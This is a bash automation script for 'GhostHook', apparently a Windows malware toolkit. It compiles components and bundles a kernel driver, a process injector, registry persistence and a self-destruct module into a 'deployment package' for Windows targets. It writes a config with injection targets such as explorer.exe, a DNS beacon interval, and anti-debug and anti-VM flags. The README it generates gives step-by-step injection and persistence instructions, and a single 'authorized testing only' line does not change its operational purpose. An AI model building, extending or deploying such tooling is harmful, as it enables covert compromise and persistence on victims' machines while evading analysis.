#!/bin/bash

# GhostHook Linux Automation Script
# For cross-platform development and testing

set -e

BASE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="$BASE_DIR/ghosthook.log"
STATUS_FILE="$BASE_DIR/status.txt"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log() {
    local level="$1"
    local message="$2"
    local timestamp=$(date '+%H:%M:%S')
    echo -e "${BLUE}[$timestamp]${NC} ${level} ${message}"
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
}

log_ok() {
    log "${GREEN}[OK]${NC}" "$1"
}

log_error() {
    log "${RED}[ERROR]${NC}" "$1"
}

log_warning() {
    log "${YELLOW}[WARNING]${NC}" "$1"
}

log_info() {
    log "${BLUE}[INFO]${NC}" "$1"
}

check_dependencies() {
    log_info "Checking dependencies..."
    
    local missing_deps=()
    
    if ! command -v python3 &> /dev/null; then
        missing_deps+=("python3")
    fi
    
    if ! command -v rustc &> /dev/null; then
        missing_deps+=("rust")
    fi
    
    if ! command -v wine &> /dev/null; then
        missing_deps+=("wine")
    fi
    
    if [ ${#missing_deps[@]} -ne 0 ]; then
        log_error "Missing dependencies: ${missing_deps[*]}"
        log_info "Install with: sudo apt install python3 rustc wine"
        return 1
    fi
    
    log_ok "All dependencies found"
    return 0
}

setup_wine_environment() {
    log_info "Setting up Wine environment for Windows compilation..."
    
    export WINEPREFIX="$BASE_DIR/.wine"
    export WINEARCH=win64
    
    if [ ! -d "$WINEPREFIX" ]; then
        log_info "Initializing Wine prefix..."
        winecfg /v win10 &> /dev/null
    fi
    
    log_ok "Wine environment ready"
}

compile_rust_components() {
    log_info "Compiling Rust components..."
    
    cd "$BASE_DIR/self_destruct"
    if [ -f "entropy_monitor.rs" ]; then
        if rustc entropy_monitor.rs -o entropy_monitor 2>/dev/null; then
            log_ok "Entropy monitor compiled (Linux version)"
        else
            log_warning "Rust compilation failed"
        fi
    fi
    
    cd "$BASE_DIR"
}

compile_python_components() {
    log_info "Validating Python components..."
    
    cd "$BASE_DIR/injector"
    if [ -f "process_selector.py" ]; then
        if python3 -m py_compile process_selector.py 2>/dev/null; then
            log_ok "Process selector validated"
        else
            log_warning "Python syntax errors in process_selector.py"
        fi
    fi
    
    cd "$BASE_DIR/Orchestrator"
    if [ -f "ghosthook_orchestrator.py" ]; then
        if python3 -m py_compile ghosthook_orchestrator.py 2>/dev/null; then
            log_ok "Orchestrator validated"
        else
            log_warning "Python syntax errors in orchestrator"
        fi
    fi
    
    cd "$BASE_DIR"
}

create_deployment_package() {
    log_info "Creating deployment package..."
    
    PACKAGE_DIR="$BASE_DIR/deployment_package"
    mkdir -p "$PACKAGE_DIR"
    
    # Copy automation scripts
    cp "$BASE_DIR/deploy.bat" "$PACKAGE_DIR/"
    cp "$BASE_DIR/automate.py" "$PACKAGE_DIR/"
    
    # Copy source files
    cp -r "$BASE_DIR/driver (kernel-mode operations)" "$PACKAGE_DIR/"
    cp -r "$BASE_DIR/injector" "$PACKAGE_DIR/"
    cp -r "$BASE_DIR/persistence" "$PACKAGE_DIR/"
    cp -r "$BASE_DIR/Orchestrator" "$PACKAGE_DIR/"
    cp -r "$BASE_DIR/self_destruct" "$PACKAGE_DIR/"
    
    # Create readme
    cat > "$PACKAGE_DIR/README.txt" << 'EOF'
GhostHook Deployment Package
===========================

AUTOMATED DEPLOYMENT:
- Windows: Run deploy.bat as Administrator
- Cross-platform: python3 automate.py

MANUAL DEPLOYMENT:
1. Compile components with Visual Studio
2. Load kernel driver: sc start GhostDriver
3. Select target: python process_selector.py
4. Execute injection: apc_queuer.exe [PID]
5. Install persistence: powershell registry_shadow.ps1
6. Start monitoring: entropy_monitor.exe

REQUIREMENTS:
- Administrator privileges
- Windows 10+ (target system)
- Visual Studio Build Tools
- Python 3.x
- Rust compiler (for entropy monitor)

WARNING: For authorized testing only!
EOF
    
    log_ok "Deployment package created in: $PACKAGE_DIR"
}

run_tests() {
    log_info "Running component tests..."
    
    # Test Python components
    cd "$BASE_DIR/injector"
    if python3 -c "
import process_selector
selector = process_selector.ProcessSelector()
print('ProcessSelector test: OK')
" 2>/dev/null; then
        log_ok "ProcessSelector test passed"
    else
        log_warning "ProcessSelector test failed"
    fi
    
    # Test Rust component
    cd "$BASE_DIR/self_destruct"
    if [ -f "entropy_monitor" ]; then
        if timeout 5s ./entropy_monitor --test 2>/dev/null; then
            log_ok "Entropy monitor test passed"
        else
            log_warning "Entropy monitor test failed"
        fi
    fi
    
    cd "$BASE_DIR"
}

generate_config() {
    log_info "Generating configuration files..."
    
    cat > "$BASE_DIR/config.json" << 'EOF'
{
  "deployment": {
    "target_processes": ["notepad.exe", "calc.exe", "explorer.exe"],
    "persistence_methods": ["registry", "dns", "tpm"],
    "monitoring_enabled": true,
    "self_destruct_threshold": 0.87
  },
  "network": {
    "dns_servers": [
      "ns1.example.com",
      "ns2.example.com", 
      "ns3.example.com"
    ],
    "beacon_interval": 300,
    "encryption_key_rotation": 3
  },
  "security": {
    "anti_debug": true,
    "anti_vm": true,
    "integrity_checks": true,
    "memory_protection": true
  }
}
EOF
    
    log_ok "Configuration file created"
}

main() {
    echo "╔══════════════════════════════════════════╗"
    echo "║       GhostHook Linux Automation        ║"
    echo "║        Development Environment           ║"
    echo "╚══════════════════════════════════════════╝"
    echo
    
    log_info "Starting GhostHook automation on Linux..."
    
    if ! check_dependencies; then
        exit 1
    fi
    
    setup_wine_environment
    compile_rust_components
    compile_python_components
    run_tests
    generate_config
    create_deployment_package
    
    echo
    log_ok "GhostHook automation completed successfully!"
    log_info "Deployment package ready for Windows targets"
    log_info "Use 'wine cmd' to test Windows batch scripts"
    
    echo
    echo "Next steps:"
    echo "1. Transfer deployment_package to Windows target"
    echo "2. Run deploy.bat as Administrator on target"
    echo "3. Monitor logs for deployment status"
}

# Handle script arguments
case "${1:-}" in
    --test)
        run_tests
        ;;
    --package)
        create_deployment_package
        ;;
    --config)
        generate_config
        ;;
    *)
        main "$@"
        ;;
esac